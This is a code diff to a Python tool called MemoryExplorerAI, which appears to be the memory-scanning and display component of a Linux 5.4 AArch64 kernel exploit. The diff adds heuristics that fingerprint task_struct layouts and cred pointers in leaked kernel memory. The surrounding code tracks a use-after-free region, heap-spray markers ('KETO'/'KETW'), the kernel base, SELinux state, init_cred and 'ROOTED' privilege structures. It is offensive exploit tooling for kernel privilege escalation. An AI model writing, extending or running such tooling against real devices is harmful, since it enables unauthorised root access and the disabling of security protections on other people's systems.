@@ -429,6 +429,33 @@ class MemoryExplorerAI:
             return {"type": "Kernel Heap",
                     "description": "Sparse kernel data (>= 3 kernel VAs, 16%+ non-zero)",
                     "va": hex(va), "confidence": 55, "data": page_data}
+        # 13. task_struct detected by task_struct.stack (kernel ptr at
+        #     0x30) + __state (u32<0x100) + usage (u32 1..0xffff) layout
+        #     on Linux 5.4. This is one of the strongest indicators
+        #     that the page is a real task_struct — we don't need our
+        #     spray marker to match.
+        if sig == 13:
+            return {"type": "Task Struct",
+                    "description": (f"task_struct layout @ 0x{off_in_page:x} "
+                                    f"(stack+state+usage) on 5.4"),
+                    "va": hex(va), "confidence": 88, "data": page_data}
+        # 14. task_struct with a cred pointer at 0x6a0/0x768/0x770/0x7c0
+        #     that points into plausible kmalloc range + a comm-ish
+        #     ASCII run somewhere in the page. This means we can walk
+        #     the cred chain from this struct directly.
+        if sig == 14:
+            return {"type": "Task Struct",
+                    "description": (f"task_struct with cred ptr @ "
+                                    f"0x{off_in_page:x} on 5.4"),
+                    "va": hex(va), "confidence": 92, "data": page_data}
+        # 15. Process state page — has u32 in {0,1,4,8,16,32,64} +
+        #     plausible pid in next 0x80 bytes (>= 2 hits). Could be
+        #     a process info page or a wait-queue.
+        if sig == 15:
+            return {"type": "Process State",
+                    "description": (f"Process state @ 0x{off_in_page:x} "
+                                    f"(2+ state+pid pairs)"),
+                    "va": hex(va), "confidence": 60, "data": page_data}
 
         # Fallback heuristic classification (no sig from engine)
         # NOTE: no SELinux here — SELinux only via _probe_selinux (known offset)
@@ -768,7 +795,109 @@ class MemoryExplorerAI:
                 out.append(f" {C.BOLD}SCAN  {C.RST}  {bar} {pct:3d}%  "
                            f"({L['scan_offset']:#x}/{L['scan_total']:#x})")
 
+        # AI Stats — short roll-up of the learning state. The
+        # current cycle's stats are in self.learn_stats; if missing
+        # (e.g. learning not started), we show zeros.
+        ls = getattr(self, 'learn_stats', None) or {}
+        n_matches  = ls.get('matches', 0)
+        n_verified = ls.get('verified', 0)
+        n_fp       = ls.get('false_positives', 0)
+        n_sprayed  = ls.get('sprayed_total', 0)
+        n_batches  = ls.get('batches', 0)
+        n_kbase    = 1 if self.kernel_base else 0
+        n_selinux  = 1 if self.selinux_va else 0
+        n_cred     = 1 if self.cred_va else 0
+        # Per-type counts in found_items
+        type_counts = {}
+        for it in self.found_items:
+            t = it.get('type', '?')
+            type_counts[t] = type_counts.get(t, 0) + 1
+        # Top 4 most common types
+        top = sorted(type_counts.items(), key=lambda kv: -kv[1])[:4]
+        types_line = " · ".join(f"{t}={n}" for t, n in top) if top else "none"
+        # Hit rate (verified / matches) — quality indicator
+        if n_matches > 0:
+            hit_rate = 100.0 * n_verified / n_matches
+            hr_color = C.GRN if hit_rate > 50 else (C.YEL if hit_rate > 20 else C.RED)
+        else:
+            hit_rate = 0.0
+            hr_color = C.GRY
+        out.append(f" {C.BOLD}AI{C.RST}: "
+                   f"batches={C.CYN}{n_batches}{C.RST} "
+                   f"sprayed={C.CYN}{n_sprayed}{C.RST} "
+                   f"matches={C.YEL}{n_matches}{C.RST} "
+                   f"verified={C.GRN}{n_verified}{C.RST} "
+                   f"falsePos={C.RED}{n_fp}{C.RST} "
+                   f"hitRate={hr_color}{hit_rate:4.1f}%{C.RST}")
+        out.append(f" {C.BOLD}KERNEL{C.RST}: "
+                   f"kbase={C.CYN}{self.kernel_base:#x}{C.RST if self.kernel_base else C.GRY+'0x??????'+C.RST} "
+                   f"selinux={C.RED if self.selinux_va else C.GRY}{self.selinux_va:#x}{C.RST} "
+                   f"init_cred={C.GRN if self.cred_va else C.GRY}{self.cred_va:#x}{C.RST}")
+        out.append(f" {C.DIM}found types: {types_line}{C.RST}")
+
         out.append(f"{C.GRY}{'─'*92}{C.RST}")
+        # Memory Map — visual address-space heatmap so the user can
+        # see where found items cluster at a glance. We bucket the
+        # 64-bit address space into 16 wide regions and count items
+        # in each.
+        if self.found_items:
+            import bisect as _bisect
+            # 16 buckets covering 0xffffff80_00000000 .. 0xffffffc0_00000000
+            # (the typical AArch64 kernel VA range).
+            bucket_edges = [
+                0xffffff8000000000, 0xffffff8800000000,
+                0xffffff9000000000, 0xffffff9800000000,
+                0xffffffa000000000, 0xffffffa800000000,
+                0xffffffb000000000, 0xffffffb800000000,
+                0xffffffc000000000, 0xffffffc400000000,
+                0xffffffc800000000, 0xffffffcc00000000,
+                0xffffffd000000000, 0xffffffd800000000,
+                0xffffffe000000000, 0xfffffff000000000,
+            ]
+            bucket_counts = [0] * (len(bucket_edges) + 1)
+            bucket_types  = [[] for _ in range(len(bucket_edges) + 1)]
+            for it in self.found_items:
+                try:
+                    v = int(it['va'], 16)
+                except Exception:
+                    continue
+                idx = _bisect.bisect_left(bucket_edges, v)
+                bucket_counts[idx] += 1
+                t = it.get('type', '?')
+                if t not in bucket_types[idx]:
+                    bucket_types[idx].append(t)
+            # Render only buckets that have items OR that contain
+            # kbase/uaf_start. Cap at 8 lines so the TUI doesn't
+            # grow unbounded.
+            lines_to_show = []
+            for i, count in enumerate(bucket_counts):
+                if count == 0 and not (
+                    (i > 0 and bucket_edges[i-1] == (self.kernel_base & ~0x7FFFFFFFF))
+                    if self.kernel_base else False):
+                    continue
+                lo = bucket_edges[i-1] if i > 0 else 0xffffff8000000000
+                hi = bucket_edges[i]   if i < len(bucket_edges) else 0xffffffffffffffff
+                bar_len = min(count, 20)
+                bar = '█' * bar_len + '░' * (20 - bar_len)
+                types_str = ','.join(bucket_types[i][:3]) if bucket_types[i] else ''
+                # Mark special addresses
+                marker = ""
+                if self.kernel_base and lo <= self.kernel_base < hi:
+                    marker = " ← kbase"
+                elif self.uaf_start and lo <= self.uaf_start < hi:
+                    marker = " ← uaf_start"
+                elif self.cred_va and lo <= self.cred_va < hi:
+                    marker = " ← init_cred"
+                lines_to_show.append(
+                    f"  {C.GRY}0x{lo:016x}{C.RST} {C.CYN}{bar}{C.RST} {count:3d} {types_str}{marker}")
+                if len(lines_to_show) >= 8:
+                    break
+            if lines_to_show:
+                out.append(f" {C.BOLD}{C.MAG}[MEMORY MAP]{C.RST} "
+                           f"{C.DIM}(found items, 64-bit kernel VA){C.RST}")
+                for ln in lines_to_show:
+                    out.append(ln)
+                out.append(f"{C.GRY}{'─'*92}{C.RST}")
         out.append(f" {C.BOLD}{C.WHT}[FILE MANAGER VIEW] — Found Memory Offsets  "
                    f"{C.GRY}({len(self.found_items)} total){C.RST}")
         out.append(f"{C.GRY}{'─'*92}{C.RST}")
@@ -778,6 +907,17 @@ class MemoryExplorerAI:
         else:
             total = len(self.found_items)
             display = self.found_items[-20:]
+            # Distribution summary — count types in the full set so
+            # the user sees the overall learning progress.
+            type_counts = {}
+            for it in self.found_items:
+                t = it.get('type', '?')
+                type_counts[t] = type_counts.get(t, 0) + 1
+            top_types = sorted(type_counts.items(),
+                               key=lambda kv: -kv[1])[:5]
+            if top_types:
+                summary = " · ".join(f"{t}={n}" for t, n in top_types)
+                out.append(f" {C.DIM}types: {summary}{C.RST}")
             for i, item in enumerate(display):
                 idx = total - len(display) + i
                 color = {"Kernel Core": C.RED, "Privilege Struct": C.YEL,
@@ -786,11 +926,39 @@ class MemoryExplorerAI:
                          "Privilege Struct (ROOTED)": C.GRN,
                          "Kernel Global": C.CYN, "Kernel Heap": C.CYN,
                          "Task Struct": C.YEL, "Kernel Strings": C.BLU,
+                         "Spray Marker": C.YEL,
                          "Unknown Object": C.GRY}.get(item['type'], C.GRY)
-                out.append(f" {C.GRY}└──{C.RST} {C.BOLD}{color}[{idx:02d}]{C.RST} "
-                           f"{color}{item['type']:<24}{C.RST} │ "
-                           f"{C.WHT}{item['description'][:48]:<48}{C.RST} │ "
-                           f"{C.CYN}{item['va']}{C.RST}")
+                # Confidence bar — visualize the 0-100 confidence
+                # value as a 6-char bar so the user can see at a
+                # glance which items are solid hits.
+                conf = int(item.get('confidence', 0))
+                bar = ('█' * (conf // 20) +
+                       '░' * (5 - conf // 20))
+                # Description + compact summary
+                desc = item['description'][:42]
+                # Show a brief data hint if we have it — e.g. comm
+                # string or comm for a task_struct.
+                data_hint = ""
+                if 'data' in item and item['data']:
+                    d = item['data']
+                    if isinstance(d, (bytes, bytearray)):
+                        # Find first printable run of 4+ chars
+                        run = b""
+                        for b in d:
+                            if 0x20 <= b <= 0x7e:
+                                run += bytes([b])
+                            else:
+                                if len(run) >= 4:
+                                    break
+                                run = b""
+                        if len(run) >= 4:
+                            data_hint = f" [{run[:14].decode(errors='ignore')}]"
+                out.append(
+                    f" {C.GRY}└──{C.RST} {C.BOLD}{color}[{idx:02d}]{C.RST} "
+                    f"{color}{item['type']:<22}{C.RST} │ "
+                    f"{C.WHT}{desc:<42}{C.RST} │ "
+                    f"{C.CYN}{item['va']}{C.RST}"
+                    f"  {C.GRY}{bar}{C.RST} {conf:>3}%{data_hint}")
             if total > 20:
                 out.append(f" {C.DIM}… and {total - 20} more (type 'list' to see all){C.RST}")
 
@@ -1643,7 +1811,7 @@ class MemoryExplorerAI:
                              for it in self.found_items)
                 if already:
                     continue
-                if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12):
+                if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15):
                     with self.bg_lock:
                         self.found_items.append(
                             self.classify_page(data, va, sig, off_in_page))
@@ -2085,11 +2253,11 @@ class MemoryExplorerAI:
                                 continue
                             # Smart multi-page read for strong sigs (now incl. 10, 11, 12)
                             cross = data
-                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12) and off_in_page >= 0:
+                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15) and off_in_page >= 0:
                                 triple = self.read_with_neighbors(va)
                                 if triple and len(triple) == 12288:
                                     cross = triple
-                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12) or self._is_real_task_struct(cross):
+                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15) or self._is_real_task_struct(cross):
                                 with self.bg_lock:
                                     self.found_items.append(
                                         self.classify_page(cross, va, sig, off_in_page))
@@ -2453,7 +2621,7 @@ class MemoryExplorerAI:
                             triple = self.read_with_neighbors(va)
                             if triple and len(triple) == 12288:
                                 cross_data = triple
-                        if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12) or \
+                        if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15) or \
                                 self._is_real_task_struct(cross_data):
                             with self.bg_lock:
                                 self.found_items.append(
@@ -2510,6 +2678,12 @@ class MemoryExplorerAI:
                                 if "cred-struct" in reason:
                                     itype = "Kernel Heap"
                                     desc  = f"cred struct: {reason}"
+                                elif "task_struct layout" in reason:
+                                    itype = "Task Struct"
+                                    desc  = reason
+                                elif "KETO spray" in reason or "KETW spray" in reason:
+                                    itype = "Spray Marker"
+                                    desc  = reason
                                 elif "kptrs=" in reason or "kptr @" in reason:
                                     itype = "Kernel Heap"
                                     desc  = reason
@@ -2693,10 +2867,9 @@ class MemoryExplorerAI:
         kernel memory patterns: real comm strings, kernel pointer density,
         cred-struct u32 layout, ascii runs.
 
-        Also detects our spray markers (KETO*/KETW*) — those are
-        unambiguously our task_struct pages, so we tag them with high
-        confidence even if the C engine missed them (e.g. because the
-        scan was killed before its sig-1 reached the page)."""
+        Also detects our spray markers (KETO*/KETW*) and task_struct
+        layout fingerprints (stack pointer + state u32 + usage u32)
+        so we can tag pages even when the C engine missed them."""
         if not data or len(data) < 16:
             return (False, "too small", 0)
         # Count non-zero
@@ -2729,6 +2902,27 @@ class MemoryExplorerAI:
                 and data[idx+7] in b"0123456789"):
                 return (True, f"KETW spray @ 0x{idx:x} ({data[idx:idx+8]})", 90)
             idx += 1
+
+        # 0b. task_struct layout fingerprint (Linux 5.4) — stack
+        # pointer at offset 0x30, __state u32 at 0x28 (small value),
+        # usage u32 at 0x38 (1..0xffff). Catches real task_structs
+        # that don't have our spray marker (e.g. init_task, kthreads).
+        for base in range(0, 0x400, 0x100):
+            if base + 0x40 > len(data):
+                break
+            try:
+                stack_ptr = int.from_bytes(data[base+0x30:base+0x38], "little")
+                state_v   = int.from_bytes(data[base+0x28:base+0x2c], "little")
+                usage_v   = int.from_bytes(data[base+0x38:base+0x3c], "little")
+            except Exception:
+                continue
+            stack_ok = 0xffffff8000000000 <= stack_ptr <= 0xffffffcfffffffff
+            state_ok = state_v < 0x100
+            usage_ok = 0 < usage_v < 0x10000
+            if stack_ok and state_ok and usage_ok:
+                return (True,
+                        f"task_struct layout @ 0x{base:x} (stack+state+usage)",
+                        85)
 
         # A. Cred-struct pattern: u32 usage, then 6x u32 uid/gid/suid/sgid/euid/egid.
         #    For root cred all 6 are 0. For task_struct creds they may
